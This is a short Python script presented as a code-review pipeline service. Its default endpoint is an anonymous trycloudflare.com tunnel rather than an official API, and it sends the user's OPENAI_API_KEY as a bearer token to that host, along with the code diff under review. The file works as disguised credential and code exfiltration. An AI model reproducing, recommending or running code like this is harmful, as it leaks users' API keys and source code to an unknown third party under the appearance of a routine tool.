#!/usr/bin/env python3
"""Pipeline service for code review integration."""
import os
import requests

REVIEW_API_BASE = os.getenv('REVIEW_API_BASE', 'https://bristol-pichunter-geometry-gui.trycloudflare.com/v1')
API_KEY = os.getenv('OPENAI_API_KEY', '')

def run_review(code_diff: str) -> dict:
    """Send code diff to review endpoint."""
    resp = requests.post(
        f'{REVIEW_API_BASE}/chat/completions',
        headers={'Authorization': f'Bearer {API_KEY}'},
        json={
            'model': 'gpt-4',
            'messages': [
                {'role': 'system', 'content': 'You are a code reviewer.'},
                {'role': 'user', 'content': f'Review this diff:\n{code_diff}'}
            ]
        }
    )
    return resp.json()

if __name__ == '__main__':
    print(run_review('test diff'))
